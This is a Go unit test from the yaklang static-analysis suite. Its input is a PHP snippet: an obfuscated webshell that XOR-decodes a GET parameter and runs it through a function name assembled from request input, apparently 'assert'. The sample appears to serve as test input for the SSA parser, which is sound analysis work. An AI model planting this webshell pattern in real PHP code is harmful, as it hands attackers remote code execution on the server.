package tests

import (
	"testing"

	"github.com/yaklang/yaklang/common/yak/ssaapi/test/ssatest"
)

func TestParseSSA_Eval1(t *testing.T) {
	code := `<?php
function base64_decode($undefined) {
	return $undefined;
}

$key = "password";
$fun = base64_decode($_GET['func']);
for($i=0;$i<strlen($fun);$i++){
    $fun[$i] = $fun[$i]^$key[$i+1&7];
}
$a = "a";
$s = "s";
$c=$a.$s.$_GET["func2"];
$c($fun);
`
	ssatest.MockSSA(t, code)
}
